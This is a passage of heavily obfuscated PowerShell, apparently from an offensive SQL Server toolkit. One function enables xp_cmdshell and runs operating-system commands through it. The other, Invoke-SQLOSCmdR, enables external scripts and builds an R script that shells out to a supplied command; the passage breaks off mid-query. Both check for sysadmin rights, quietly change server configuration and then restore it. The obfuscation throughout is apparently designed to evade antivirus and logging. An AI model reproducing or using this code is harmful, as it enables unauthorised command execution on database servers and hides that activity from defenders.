            try
            {
                
                ${cOn`NECt`ION}.("{1}{0}"-f'n','Ope').Invoke()

                if(-not ${su`P`PRes`SvERbO`SE})
                {
                    &("{0}{3}{1}{2}" -f'Write-','bo','se','Ver') -Message ("$Instance "+': '+'Conn'+'e'+'cti'+'on '+'Suc'+'c'+'ess.')
                }

                
                ${DIs`AbLEshO`wAD`VA`NCe`DoP`T`IO`NS} = 0
                ${dIsAblex`PcMD`SHe`Ll} = 0

                
                ${I`sSYSa`DMIn} = &("{1}{2}{0}{5}{3}{4}"-f 'Sy','Get-','SQL','minChe','ck','sad') -Instance ${INs`TA`Nce} -Credential ${CR`EdeNtI`AL} -Username ${u`sEr`NAmE} -Password ${pa`sSW`ORd} -SuppressVerbose | &("{0}{1}{2}{3}"-f'Se','lec','t','-Object') -Property ("{2}{1}{0}"-f 'sadmin','y','IsS') -ExpandProperty ("{2}{0}{1}" -f'sSysadmi','n','I')

                
                if(${i`SsYSad`MiN} -eq 'Yes')
                {
                    &("{1}{2}{0}"-f 'bose','Writ','e-Ver') -Message ("$Instance "+': '+'Yo'+'u '+'are'+' '+'a '+'s'+'ysad'+'min.')
                    ${ISXPCMdSHe`Ll`EN`ABLed} = &("{1}{0}{2}" -f't-SQLQuer','Ge','y') -Instance ${I`N`StaNce} -Query ((("{4}{0}{5}{1}{3}{2}"-f'confi','e iG5xp_cmdsh','5','elliG','sp_','gur'))."rEP`LAcE"(([char]105+[char]71+[char]53),[STRINg][char]39)) -Username ${U`s`E`RnAme} -Password ${PassW`o`Rd} -Credential ${crE`DE`N`TiAl} -SuppressVerbose | &("{1}{3}{2}{0}" -f '-Object','S','t','elec') -Property ("{0}{2}{1}" -f'con','e','fig_valu') -ExpandProperty ("{2}{1}{0}"-f 'e','valu','config_')
                    ${ISSH`owA`DvANcE`den`AbL`Ed} = &("{3}{1}{0}{2}"-f'Qu','L','ery','Get-SQ') -Instance ${iNSTa`NCE} -Query ((("{6}{7}{8}{0}{2}{4}{10}{3}{1}{9}{5}"-f'dShow','ed Op',' ','vanc','A','Kd','s','p_configure ','eK','tionse','d'))."ReP`La`cE"('eKd',[StrINg][CHAR]39)) -Username ${UsEr`NaME} -Password ${p`As`sword} -Credential ${Cr`EDE`N`TiAL} -SuppressVerbose | &("{0}{1}{2}"-f'Selec','t-Obj','ect') -Property ("{0}{2}{1}" -f 'c','alue','onfig_v') -ExpandProperty ("{2}{1}{0}" -f'ue','ig_val','conf')
                }
                else
                {
                    &("{0}{2}{1}" -f 'Write-Ver','se','bo') -Message ("$Instance "+': '+'You'+' '+'a'+'re '+'n'+'ot '+'a '+'s'+'ysadmi'+'n'+'. '+'This'+' '+'comm'+'a'+'nd '+'req'+'uire'+'s '+'s'+'ys'+'admin '+'pri'+'vile'+'ges.')

                    
                    ${nu`lL} = ${TBl`Re`SU`LtS}."RO`WS".("{1}{0}"-f 'd','Ad').Invoke("$ComputerName","$Instance",("{1}{6}{5}{7}{4}{3}{2}{0}" -f '.','No sysadmin','s','e','ivileg','p',' ','r'))
                    return
                }

                
                if (${isSHow`A`D`Vanc`E`DeNa`BLeD} -eq 1)
                {
                    &("{2}{0}{1}{3}"-f'it','e-Verbos','Wr','e') -Message ("$Instance "+': '+'Sho'+'w '+'Adva'+'nc'+'ed '+'Opt'+'ions'+' '+'i'+'s '+'al'+'ready'+' '+'e'+'n'+'abled.')
                }
                else
                {
                    &("{2}{1}{4}{3}{0}" -f'ose','it','Wr','erb','e-V') -Message ("$Instance "+': '+'Sh'+'ow '+'Advan'+'ced'+' '+'Opt'+'i'+'ons '+'is'+' '+'disa'+'bled.')
                    ${DI`sABl`EshO`W`ADvan`C`eDOpTIOnS} = 1

                    
                    &("{1}{0}{2}" -f '-SQLQu','Get','ery') -Instance ${i`NsT`AN`Ce} -Query ((("{2}{0}{4}{1}{7}{6}{12}{13}{3}{8}{11}{9}{10}{5}" -f'nfi',' {','sp_co','{0','gure','E','dvan','0}Show A','},1;','ECONFIGU','R','R','ced Optio','ns'))  -f  [cHAr]39) -Username ${Use`Rn`A`Me} -Password ${PAS`S`wO`Rd} -Credential ${CR`Ed`eNtIAL} -SuppressVerbose

                    
                    ${i`SSh`owADvAnc`E`DeNAb`leD2} = &("{3}{0}{1}{2}" -f'LQu','e','ry','Get-SQ') -Instance ${i`NSTA`NCe} -Query ((("{5}{3}{0}{1}{6}{7}{2}{4}" -f'igure',' OtBShow Adv',' OptionsOt','onf','B','sp_c','ance','d'))  -ReplacE ([cHar]79+[cHar]116+[cHar]66),[cHar]39) -Username ${user`NA`ME} -Password ${P`A`sswoRd} -Credential ${cRe`DeNTI`AL} -SuppressVerbose | &("{1}{0}{4}{3}{2}"-f 'ele','S','t','bjec','ct-O') -Property ("{0}{1}{2}" -f 'config_v','al','ue') -ExpandProperty ("{2}{1}{0}{3}"-f'va','ig_','conf','lue')

                    if (${i`SshoWADVancEDeNa`BLE`d2} -eq 1)
                    {
                        &("{3}{0}{1}{2}" -f'rit','e-','Verbose','W') -Message ("$Instance "+': '+'Ena'+'bled '+'S'+'how '+'A'+'dvan'+'ced '+'O'+'pti'+'ons.')
                    }
                    else
                    {
                        &("{2}{0}{1}{3}"-f 'Ve','rb','Write-','ose') -Message ("$Instance "+': '+'E'+'nabling'+' '+'Sho'+'w '+'Adva'+'nc'+'ed '+'Op'+'ti'+'ons '+'fai'+'led'+'. '+'Aborti'+'n'+'g.')

                        
                        ${N`ULl} = ${T`Bl`R`eSUlts}."R`Ows".("{1}{0}" -f'dd','A').Invoke("$ComputerName","$Instance",("{3}{6}{4}{2}{7}{5}{0}{1}" -f 'ption','s.','how Adv','Could not en','le S','O','ab','anced '))
                        return
                    }
                }

                
                if (${I`sx`PCm`dSHeLleNABleD} -eq 1)
                {
                    &("{0}{2}{4}{3}{1}" -f'Writ','bose','e-','er','V') -Message ("$Instance "+': '+'x'+'p_'+'cmdsh'+'ell '+'is'+' '+'alr'+'eady '+'en'+'able'+'d.')
                }
                else
                {
                    &("{2}{1}{4}{3}{0}" -f 'e','rite','W','Verbos','-') -Message ("$Instance "+': '+'x'+'p_cm'+'dsh'+'ell '+'i'+'s '+'d'+'is'+'abled.')
                    ${diSAbLEXpcMd`s`h`ElL} = 1

                    
                    &("{2}{0}{1}"-f 'QLQue','ry','Get-S') -Instance ${INs`T`ANCE} -Query ((("{6}{2}{1}{8}{7}{0}{3}{5}{4}"-f 'l','figure pPK','con','pPK,1;RE','RE','CONFIGU','sp_','el','xp_cmdsh'))."rEpL`ACE"(([CHar]112+[CHar]80+[CHar]75),[STring][CHar]39)) -Username ${U`SEr`Name} -Password ${pa`SS`WoRd} -Credential ${c`ReD`e`NtIaL} -SuppressVerbose

                    
                    ${isX`PCmDSHELL`eN`Ab`LE`D2} = &("{2}{0}{1}"-f '-SQ','LQuery','Get') -Instance ${In`s`TanCE} -Query ("{3}{1}{4}{2}{5}{0}" -f 'xp_cmdshell','conf','gu','sp_','i','re ') -Username ${US`E`RnAME} -Password ${PAS`swo`RD} -Credential ${cREDe`N`Ti`AL} -SuppressVerbose | &("{0}{1}{2}"-f'Select-Ob','jec','t') -Property ("{3}{0}{2}{1}" -f 'onfig','ue','_val','c') -ExpandProperty ("{0}{2}{1}"-f'config_val','e','u')

                    if (${IsXpC`mdShElL`eN`ABL`eD2} -eq 1)
                    {
                        &("{2}{0}{3}{1}" -f't','rbose','Wri','e-Ve') -Message ("$Instance "+': '+'Enable'+'d '+'xp_cm'+'d'+'shel'+'l.')
                    }
                    else
                    {
                        &("{1}{2}{0}"-f 'rbose','Wri','te-Ve') -Message ("$Instance "+': '+'Enab'+'ling '+'xp'+'_cmd'+'shell'+' '+'fai'+'led.'+' '+'A'+'b'+'orting.')

                        
                        ${NU`Ll} = ${T`B`LRESul`Ts}."Ro`Ws".("{1}{0}" -f 'd','Ad').Invoke("$ComputerName","$Instance",("{1}{0}{2}{5}{4}{3}"-f 'uld not enabl','Co','e x','.','l','p_cmdshel'))

                        return
                    }
                }

                
                &("{2}{1}{3}{0}" -f'e','rb','Write-Ve','os') -Message ("$Instance "+': '+'Runni'+'ng '+'c'+'o'+'mma'+'nd: '+"$Command")
                
                ${q`UerY} = ('EX'+'EC '+'ma'+'ster..'+'xp_cmdshel'+'l '+"'$Command'")

                
                ${cmdREs`U`Lts} = &("{0}{2}{1}" -f'G','Query','et-SQL') -Instance ${inS`TA`NcE} -Query ${Que`RY} -Username ${u`S`ERNAmE} -Password ${pa`Ssw`orD} -Credential ${CRE`De`NTi`AL} -SuppressVerbose | &("{0}{3}{1}{2}"-f 'Select-Ob','e','ct','j') -Property ("{1}{0}{2}"-f 'utp','o','ut') -ExpandProperty ("{1}{0}"-f'ut','outp')

                
                if(${rA`W`RE`SulTs})
                {
                    ${Cm`DrE`sultS} | &("{2}{0}{1}"-f'lec','t','Se') ("{0}{1}"-f'outp','ut') -ExpandProperty ("{1}{0}{2}" -f'p','out','ut')
                }
                else
                {
                    ${Nu`LL} = ${tB`LrE`suL`TS}."ro`wS"."A`Dd"(${cOMPUt`E`RNAMe}, ${InsTA`N`Ce}, [string]${cMDRESu`l`TS})
                }

                
                if(${dIS`ABLE`xpCmD`S`h`eLL} -eq 1)
                {
                    &("{3}{0}{1}{2}" -f 'e-Ver','bo','se','Writ') -Message ("$Instance "+': '+'Disa'+'bli'+'ng '+'xp_'+'cm'+'d'+'shell')
                    &("{0}{3}{1}{2}"-f'Get','QL','Query','-S') -Instance ${INs`TANce} -Query ((("{1}{6}{7}{2}{4}{5}{0}{8}{3}" -f'O','sp_c','e {0}xp_cmdshell','GURE','{','0},0;REC','o','nfigur','NFI')) -F  [char]39) -Username ${Us`ErNA`me} -Password ${p`A`SsworD} -Credential ${C`ReDeNTI`AL} -SuppressVerbose
                }

                
                if(${disABlESHo`waDVANCE`DoptI`O`NS} -eq 1)
                {
                    &("{1}{0}{2}"-f '-V','Write','erbose') -Message ("$Instance "+': '+'Disa'+'blin'+'g'+' '+'S'+'how '+'Adv'+'ance'+'d '+'Optio'+'n'+'s')
                    &("{1}{3}{0}{2}"-f 'QLQu','Ge','ery','t-S') -Instance ${iNSTa`N`ce} -Query ((("{10}{5}{2}{4}{6}{1}{8}{3}{9}{0}{7}"-f'0;RECONFI','anced Op','igu','ons','re bIGSh','onf','ow Adv','GURE','ti','bIG,','sp_c'))  -rePlaCE  ([ChaR]98+[ChaR]73+[ChaR]71),[ChaR]39) -Username ${USer`NA`me} -Password ${pAS`Sw`o`RD} -Credential ${crEDe`N`Ti`Al} -SuppressVerbose
                }

                
                ${C`Onne`cTiON}.("{0}{1}"-f'Clo','se').Invoke()

                
                ${cONnE`C`TIOn}.("{2}{1}{0}" -f'e','os','Disp').Invoke()
            }
            catch
            {
                

                if(-not ${SuPPr`eSS`VEr`B`OSE})
                {
                    ${eRrOr`m`esSA`ge} = ${_}."E`xcEPtI`oN"."m`EsSA`ge"
                    &("{1}{2}{0}{3}{4}" -f'e','Wri','te-V','rbo','se') -Message ("$Instance "+': '+'Co'+'nn'+'ection '+'Faile'+'d.')
                    
                }

                
                ${NU`Ll} = ${t`BLR`es`UlTs}."R`owS".("{1}{0}" -f'dd','A').Invoke("$ComputerName","$Instance",("{1}{4}{2}{0}{3}"-f'ib','Not ','s','le','Acces'))
            }
        }

        
        ${pIP`el`INe`ITEMS} | &("{1}{3}{4}{2}{0}" -f 'llel','Invoke','ra','-','Pa') -ScriptBlock ${M`YScRIpTb`loCk} -ImportSessionFunctions -ImportVariables -Throttle ${THR`e`ADS} -RunspaceTimeout 2 -Quiet -ErrorAction ("{0}{3}{2}{4}{1}" -f'S','ue','ntlyCo','ile','ntin')

        return ${tBLR`E`SuLTs}
    }
}







Function  iNv`oK`E-`SQlOSC`mDr
{
    
    [CmdletBinding()]
    Param(
        [Parameter(MAndatorY = ${f`ALSe},
        HelPMeSsage = {"{4}{3}{7}{5}{0}{1}{11}{9}{14}{6}{10}{12}{8}{2}{13}"-f'main ','acco',' wi','ver o','SQL Ser','o',' authe','r d','te',' t','n','unt','tica','th.','o'})]
        [string]${uSer`NAMe},

        [Parameter(manDAtoRY = ${fA`l`Se},
        hElPmESsAGe = {"{4}{9}{5}{6}{0}{8}{2}{7}{3}{1}" -f'pas','.',' authentica','th','SQL S','r or domai','n account ','te wi','sword to','erve'})]
        [string]${Pas`SwO`Rd},

        [Parameter(ManDAtORY = ${Fa`LsE},
        heLPMEssage = {"{4}{3}{0}{1}{2}" -f'ows cr','e','dentials.','nd','Wi'})]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]${c`RedEnTI`AL} =   (geT-vaRIAbLe  0459M2  ).ValUE::"emp`TY",

        [Parameter(MaNDAToRy = ${f`A`LsE},
                ValueFrOMpIPElINe = ${TR`Ue},
                vALuEfROmPIPeLineBYPropERtyname = ${T`RuE},
        HeLpmESSAgE = {"{2}{5}{3}{1}{4}{0}{6}"-f'instance to con','ve','SQ','er','r ','L S','nection to.'})]
        [string]${i`NstAN`Ce},

        [Parameter(maNDAToRY = ${f`A`LsE},
        hElpmessAgE = {"{9}{0}{5}{10}{7}{3}{6}{8}{11}{1}{4}{2}" -f'nne','Connec','on.','Dedi','ti','c','cate','g ','d Admi','Co','t usin','n '})]
        [Switch]${D`AC},

        [Parameter(MaNdatory = ${T`RUE},
        HElpMessagE = {"{0}{6}{4}{1}{5}{2}{3}" -f 'OS',' t','executed','.','command','o be ',' '})]
        [String]${C`OMma`Nd} = ("{1}{0}" -f'mi','whoa'),

        [Parameter(mANdATory = ${f`A`lse},
        HelPmESSage = {"{2}{1}{4}{0}{3}" -f'ut','ec','Conn','.','tion timeo'})]
        [string]${TIm`E`OUT},

        [Parameter(ManDaTORY = ${f`A`lSe},
        HeLPMeSsAge = {"{3}{5}{1}{2}{4}{0}" -f '.',' ','of','N',' threads','umber'})]
        [int]${Th`ReadS} = 1,

        [Parameter(MANdATOry = ${f`AlSe},
        hElpmeSsaGE = {"{7}{8}{0}{5}{3}{1}{13}{12}{14}{15}{2}{4}{6}{10}{11}{9}" -f 'press verbos','rs',' f','erro','unction ','e ','is wr','Su','p','d.','ap','pe','sed','.  U',' whe','n'})]
        [switch]${s`UPprES`s`VErBOSe},

        [Parameter(mANDAToRy = ${f`AlSE},
        HeLpmEsSagE = {"{11}{9}{2}{6}{12}{1}{4}{10}{7}{5}{3}{0}{8}" -f'am','tho','w','e n','u','r or instanc',' re','he compute','e.','w the ra','t t','Just sho','sults wi'})]
        [switch]${raWrEsu`L`TS}
    )

    Begin
    {
        
        ${T`Blc`oMM`AnDs} = &("{2}{1}{0}" -f 'bject','-O','New') -TypeName ("{0}{2}{4}{3}{6}{1}{5}"-f'Sy','a','stem.Data.D','t','a','ble','aT')
        ${Tb`LR`ESULTs} = &("{3}{1}{0}{2}"-f 'e','j','ct','New-Ob') -TypeName ("{2}{4}{0}{1}{3}" -f'ata','.Dat','System','aTable','.D')
        ${N`ULL} = ${TBLreS`U`LTS}."coL`UMnS".("{0}{1}" -f 'Ad','d').Invoke(("{1}{2}{0}" -f 'terName','Com','pu'))
        ${n`ULl} = ${tBLRES`U`LTS}."CO`LuMNS".("{0}{1}" -f 'A','dd').Invoke(("{2}{0}{1}" -f 's','tance','In'))
        ${n`ULL} = ${t`Bl`RES`ULTs}."coL`Um`Ns".("{0}{1}"-f'Ad','d').Invoke(("{2}{1}{0}" -f 'ts','ndResul','Comma'))


        
        ${pIpEl`iN`EIT`E`ms} = &("{0}{2}{1}" -f 'New','Object','-') -TypeName ("{5}{0}{2}{1}{4}{3}"-f 'ys','a.Dat','tem.Dat','e','aTabl','S')

        
        if(-not ${Ins`Tan`ce})
        {
            ${i`NSTa`Nce} = ${env:`compUt`E`R`N`AME}
        }

        
        if(${i`NSTance})
        {
            ${Pro`Videi`N`S`TAn`ce} = &("{0}{3}{1}{2}" -f 'Ne','j','ect','w-Ob') -TypeName ("{2}{1}{0}"-f'bject','O','PS') -Property @{
                ("{1}{0}{2}"-f'nst','I','ance') = ${i`NstAn`ce}
            }
        }

        
        ${piPElIN`Eit`E`mS} = ${PiPE`linE`it`Ems} + ${PrOV`iDeIN`st`AncE}
    }

    Process
    {
        
        ${PIP`eliNE`I`Te`Ms} = ${p`ipEL`I`NEI`TEms} + ${_}
    }

    End
    {
        
        ${My`S`cRiP`TbLock} = {
            ${I`NStA`NcE} = ${_}."InS`T`ANCe"

            
            ${coMp`Ut`e`R`NamE} = &("{2}{6}{3}{1}{4}{5}{0}"-f'ce','ns','Get-Comput','mI','ta','n','erNameFro') -Instance ${INst`A`Nce}

            
            if(-not ${iNS`TA`Nce})
            {
                ${inST`A`N`cE} = ${env:c`O`m`PuTER`NaME}
            }

            
            if(${d`AC})
            {
                
                ${CoN`NECt`IOn} = &("{5}{1}{4}{2}{0}{3}"-f 'e','e','onObj','ct','t-SQLConnecti','G') -Instance ${in`ST`AnCE} -Username ${U`sErN`AmE} -Password ${p`AsSw`oRD} -Credential ${CRE`DEnT`iaL} -DAC -TimeOut ${Time`o`UT}
            }
            else
            {
                
                ${cON`N`e`CTION} = &("{3}{2}{5}{4}{6}{1}{0}"-f'ect','Obj','t-SQLC','Ge','nnec','o','tion') -Instance ${iNS`TaN`Ce} -Username ${us`eR`NaMe} -Password ${PAS`sW`ord} -Credential ${c`ReDeNt`I`Al} -TimeOut ${TIM`Eo`UT}
            }

            
            try
            {
                
                ${cOnn`E`ctIOn}.("{0}{1}" -f 'Ope','n').Invoke()

                if(-not ${SUPpre`S`sV`E`RBOSe})
                {
                    &("{1}{2}{0}"-f'e','Write-','Verbos') -Message ("$Instance "+': '+'Conn'+'ec'+'tion '+'S'+'ucc'+'ess.')
                }

                
                ${DisAblEsHo`WA`dvANC`E`dOP`TioNs} = 0
                ${D`iSABL`Ee`X`TErNALScR`ipTs} = 0

                

                
                ${i`Ssys`ADM`in} = &("{1}{0}{4}{2}{3}"-f't-SQL','Ge','inChec','k','Sysadm') -Instance ${i`NSTan`Ce} -Credential ${cred`eNt`I`AL} -Username ${USE`RNAME} -Password ${PA`Ss`WOrd} -SuppressVerbose | &("{3}{0}{1}{2}"-f 'elect-','Obje','ct','S') -Property ("{0}{1}{2}"-f 'I','sSysad','min') -ExpandProperty ("{0}{1}{2}{3}" -f 'I','sSysa','dm','in')

                
                if(${i`SSyS`AdmIN} -eq 'Yes')
                {
                    &("{3}{2}{1}{0}"-f 'e','bos','e-Ver','Writ') -Message ("$Instance "+': '+'You'+' '+'are'+' '+'a '+'sys'+'a'+'dmin.')
                    ${Is`ExtE`RNAlsCR`IPTS`enAB`L`ED} = &("{2}{3}{0}{1}"-f'SQLQuer','y','G','et-') -Instance ${I`Ns`TaN`CE} -Query ((("{2}{6}{0}{4}{3}{8}{7}{5}{10}{1}{9}{11}"-f'gure','ble','sp_con','FzX',' ',' sc','fi','ernal','ext','d','ripts ena','FzX'))."r`E`PlaCe"(([ChaR]70+[ChaR]122+[ChaR]88),[sTrING][ChaR]39)) -Username ${USER`N`AMe} -Password ${p`ASSWO`RD} -Credential ${CR`E`DeNTIal} -SuppressVerbose | &("{2}{1}{0}" -f '-Object','lect','Se') -Property ("{1}{0}{2}" -f '_va','config','lue') -ExpandProperty ("{1}{2}{0}" -f'alue','co','nfig_v')
                    ${iSS`hOWAd`VA`NCED`e`NabLEd} = &("{2}{1}{0}"-f 'y','uer','Get-SQLQ') -Instance ${i`NsTAn`CE} -Query ((("{1}{9}{4}{2}{3}{10}{5}{8}{6}{0}{7}"-f 'onsz','s','onfigure zu','JSho','_c','Advan','ed Opti','uJ','c','p','w '))."R`EPLA`Ce"('zuJ',[StRiNg][ChaR]39)) -Username ${US`Er`N`AMe} -Password ${pasSW`oRD} -Credential ${cRe`De`NtIaL} -SuppressVerbose | &("{1}{2}{0}"-f 'Object','Sele','ct-') -Property ("{0}{3}{1}{2}" -f 'co','i','g_value','nf') -ExpandProperty ("{0}{1}{2}{3}"-f 'con','fi','g_','value')
                }
                else
                {
                    &("{1}{0}{2}"-f'-','Write','Verbose') -Message ("$Instance "+': '+'Yo'+'u '+'are'+' '+'not'+' '+'a '+'sysa'+'d'+'min. '+'Th'+'is '+'c'+'o'+'mmand '+'req'+'uire'+'s '+'sys'+'adm'+'in '+'privileg'+'e'+'s.')

                    
                    ${NU`Ll} = ${TBlre`sUL`Ts}."ro`ws".("{0}{1}" -f 'Ad','d').Invoke("$ComputerName","$Instance",("{3}{2}{1}{5}{0}{6}{4}"-f'vi',' p',' sysadmin','No','es.','ri','leg'))
                    return
                }

                
                if (${I`S`Sho`WaDVanCedENab`LeD} -eq 1)
                {
                    &("{1}{0}{2}"-f'ite','Wr','-Verbose') -Message ("$Instance "+': '+'Sho'+'w '+'Adv'+'an'+'ced '+'O'+'pt'+'ions '+'is'+' '+'alr'+'ea'+'dy '+'ena'+'bled.')
                }
                else
                {
                    &("{3}{1}{0}{2}"-f's','ite-Verbo','e','Wr') -Message ("$Instance "+': '+'Sho'+'w '+'Advanc'+'e'+'d '+'Optio'+'ns'+' '+'is'+' '+'disab'+'le'+'d.')
                    ${D`is`Ab`le`S`h`OwA`dvancedOpTIo`Ns} = 1

                    
                    &("{0}{1}{3}{2}" -f 'G','et-SQL','uery','Q') -Instance ${INsT`AnCE} -Query ((("{13}{8}{1}{0}{4}{14}{7}{15}{9}{10}{5}{6}{3}{2}{11}{12}"-f 'figure {','n','FIG','CON','0}Show A','},1;R','E','va','p_co','tions','{0','U','RE','s','d','nced Op'))-f  [cHAr]39) -Username ${us`eR`NAMe} -Password ${p`AsSW`Ord} -Credential ${Cred`ENT`ial} -SuppressVerbose

                    
                    ${ISSH`o`W`A`Dv`ANCe`DenaBled2} = &("{1}{2}{0}" -f'ery','Get-SQL','Qu') -Instance ${i`NS`TA`NCE} -Query ((("{4}{10}{0}{8}{9}{11}{2}{5}{6}{7}{1}{3}"-f'_co','n','e','s{0}','s',' {0}Show ','Advanced O','ptio','n','fig','p','ur'))  -F [ChAr]39) -Username ${U`s`ER`Name} -Password ${Pas`sWo`Rd} -Credential ${cR`edEnT`IAl} -SuppressVerbose | &("{0}{1}{3}{2}"-f'S','elec','ject','t-Ob') -Property ("{1}{3}{0}{2}" -f'g','c','_value','onfi') -ExpandProperty ("{1}{2}{0}"-f'value','co','nfig_')

                    if (${I`SS`h`oWaDV`A`NCed`EnaBlEd2} -eq 1)
                    {
                        &("{1}{0}{2}"-f 'te-','Wri','Verbose') -Message ("$Instance "+': '+'Enab'+'l'+'ed '+'Sho'+'w '+'Adv'+'anc'+'ed '+'Opti'+'ons'+'.')
                    }
                    else
                    {
                        &("{1}{2}{3}{0}"-f'e','Writ','e-Ver','bos') -Message ("$Instance "+': '+'En'+'abli'+'ng '+'Sho'+'w '+'A'+'dvanced '+'Opti'+'ons'+' '+'f'+'aile'+'d. '+'A'+'borting'+'.')

                        
                        ${nu`lL} = ${t`BlResu`Lts}."R`oWs".("{0}{1}" -f'A','dd').Invoke("$ComputerName","$Instance",("{8}{3}{4}{9}{7}{5}{2}{0}{6}{1}"-f'vanc','tions.','w Ad','ou','l','ho','ed Op','enable S','C','d not '))
                        return
                    }
                }

                
                if (${I`S`e`xteRNalSC`RIPtsenAbL`ed} -eq 1)
                {
                    &("{2}{0}{1}"-f'rbos','e','Write-Ve') -Message ("$Instance "+': '+'Extern'+'al'+' '+'scrip'+'ts '+'ar'+'e '+'al'+'ready '+'enabl'+'ed.')
                }
                else
                {
                    &("{2}{0}{1}" -f'e-Verbos','e','Writ') -Message ("$Instance "+': '+'Exte'+'rn'+'al '+'scrip'+'t'+'s '+'e'+'nable'+'d '+'a'+'re '+'d'+'isabl'+'ed.')
                    ${dISab`LeE`xTER`NalSCr`i`PTS} = 1

                    
                    &("{3}{1}{2}{0}" -f'Query','et-S','QL','G') -Instance ${i`NsT`Ance} -Query ((("{4}{6}{14}{9}{1}{8}{2}{3}{0}{11}{5}{15}{7}{16}{12}{10}{13}"-f',1;','ripts','enabledTu','N','sp_','CO','c','FIGU',' ','TuNexternal sc','OVERR','RE',' WITH ','IDE','onfigure ','N','RE')) -replAcE  ([ChAR]84+[ChAR]117+[ChAR]78),[ChAR]39) -Username ${usE`RNAmE} -Password ${P`A`sSWORd} -Credential ${c`R`Ed`ENTiAl} -SuppressVerbose

                    
                    ${ISe`xTe`RnA`lscR`ip`T`seNAbLED2} = &("{3}{1}{0}{2}"-f'LQu','t-SQ','ery','Ge') -Instance ${INSt`AN`cE} -Query ((("{5}{1}{0}{6}{8}{3}{9}{4}{7}{2}"-f'co','_','bled{0}','er','scrip','sp','n','ts ena','figure {0}ext','nal '))  -F  [CHar]34) -Username ${u`sEr`N`Ame} -Password ${pas`sWo`Rd} -Credential ${C`RE`dentiAL} -SuppressVerbose | &("{0}{2}{1}{3}" -f 'Sele','Obj','ct-','ect') -Property ("{1}{2}{0}{3}" -f 'u','config','_val','e') -ExpandProperty ("{1}{2}{0}{3}"-f 'nfig_va','c','o','lue')

                    if (${ISE`XTe`RN`AlSCR`ipt`SEnaBL`Ed2} -eq 1)
                    {
                        &("{2}{0}{1}"-f 't','e-Verbose','Wri') -Message ("$Instance "+': '+'Enabl'+'e'+'d '+'e'+'xternal'+' '+'scr'+'ip'+'ts.')
                    }
                    else
                    {
                        &("{1}{0}{2}"-f'rbos','Write-Ve','e') -Message ("$Instance "+': '+'En'+'ablin'+'g '+'e'+'xternal'+' '+'scr'+'ipts '+'fa'+'i'+'led. '+'Abort'+'in'+'g.')

                        
                        ${n`ULl} = ${T`BL`RESults}."r`OWS".("{0}{1}"-f'Ad','d').Invoke("$ComputerName","$Instance",("{2}{8}{5}{3}{4}{0}{9}{7}{6}{1}"-f ' ','cripts.','Could',' en','able','ot','s',' ',' n','external'))

                        return
                    }
                }

                
                ${enaBLeD`INRun`VAl`UE} = &("{3}{0}{1}{2}" -f 'SQ','L','Query','Get-') -Instance ${iNs`TA`Nce} -Query ((("{14}{3}{13}{10}{15}{0}{1}{6}{5}{8}{9}{7}{2}{4}{12}{11}" -f 'ste','r.sys.configu','ternal ','value_','scri','m','rations WHERE na',' {0}ex','e LI','KE','OM ','{0}','pts enabled','in_use FR','SELECT ','ma'))  -f  [ChAR]39) -Username ${USer`NA`ME} -Password ${P`ASSworD} -Credential ${c`Re`dentIal} -SuppressVerbose | &("{0}{1}{2}" -f 'S','elect','-Object') -ExpandProperty ("{2}{1}{0}" -f 'e','ue_in_us','val')            
                if(${E`N`ABle`DiNRUN`VaL`UE} -eq 0){
                    &("{0}{3}{1}{2}"-f'Wr','os','e','ite-Verb') -Message ("$Instance "+': '+'T'+'he '+(('W'+'I'+'Dexternal ')  -rEpLACe'WID',[ChAr]39)+'script'+'s'+' '+(('en'+'ab'+'le'+'dE'+'1p ')  -CRepLACE  ([Char]69+[Char]49+[Char]112),[Char]39)+'se'+'tting '+'is'+' '+'n'+'ot '+'e'+'nab'+'led '+'in'+' '+'r'+'untime'+'.')
                    &("{2}{1}{3}{0}"-f 'erbose','rite-','W','V') -Message ("$Instance "+': '+'- '+'The'+' '+'SQ'+'L '+'S'+'erver'+' '+'ser'+'vice '+'w'+'ill '+'n'+'eed '+'t'+'o '+'be'+' '+'manually'+' '+'rest'+'art'+'ed '+'fo'+'r '+'t'+'he '+'chan'+'g'+'e '+'to'+' '+'t'+'ake '+'effec'+'t.')
                    &("{0}{2}{1}"-f'Writ','Verbose','e-') -Message ("$Instance "+': '+'- '+'Not'+' '+'recom'+'me'+'nd'+'ed '+'unle'+'ss '+('youIKHr'+'e ')."Re`placE"(([CHAr]73+[CHAr]75+[CHAr]72),[sTrINg][CHAr]39)+'t'+'he '+'DB'+'A.')
                    ${N`Ull} = ${TB`lr`Esu`lTS}."RO`wS".("{0}{1}" -f'Ad','d').Invoke("$ComputerName","$Instance",("{0}{2}{1}{5}{4}{6}{3}"-f 'Ex','cripts ','ternal s','e.','ot enab','n','led in runtim'))
                    return
                }else{
                    &("{1}{0}{3}{2}" -f 'ite-Ve','Wr','bose','r') -Message ("$Instance "+': '+'The'+' '+('{'+'0}e'+'x'+'ternal ')  -f[cHAr]39+'scri'+'pts'+' '+('enabledj'+'H9'+' ')."reP`LaCE"('jH9',[StRIng][ChaR]39)+'set'+'ting '+'i'+'s '+'e'+'nabled'+' '+'i'+'n '+('r'+'untime'+'.cf'+'9')."RE`P`laCe"(([CHAR]99+[CHAR]102+[CHAR]57),[stRIng][CHAR]39))
                }            

                
                &("{1}{2}{0}" -f'e-verbose','w','rit') ("$instance "+': '+'Ex'+'e'+'cutin'+'g '+'command'+':'+' '+"$Command")               
                ${Que`RY`CMD`ExEcU`Te} = 
(('G'+'CM'+'
EXEC ')."REP`LAcE"(([cHAR]71+[cHAR]67+[cHAR]77),[stRINg][cHAR]34)+'sp_'+'e'+'xecute_e'+'xte'+'r'+'n'+'al_s'+'cript
 '+' '+('@langu'+'age'+'=NCi7RC'+'i'+'7'+',
 ')."RePl`AcE"(([CHAR]67+[CHAR]105+[CHAR]55),[sTRINg][CHAR]39)+' '+('@'+'sc'+'ri'+'pt'+'='+'N{0}OutputDataSe'+'t ') -f  [cHAr]39+'<'+'- '+('data.frame(s'+'h'+'ell'+'({0}{1}'+'C'+'om'+'mand{0'+'},'+'i'+'nt'+'ern=T)'+')'+'{2}
 ')-F[ChaR]34,[ChaR]36,[ChaR]39+' '+'WIT'+'H '+'RES'+'U'+'LT '+'SE'+'TS '+'((['+'Out'+'put] '+('v'+'a'+'rchar(m'+'ax))'+');
T'+'Vj')."R`EPlacE"('TVj',[sTriNG][cHar]34))

                
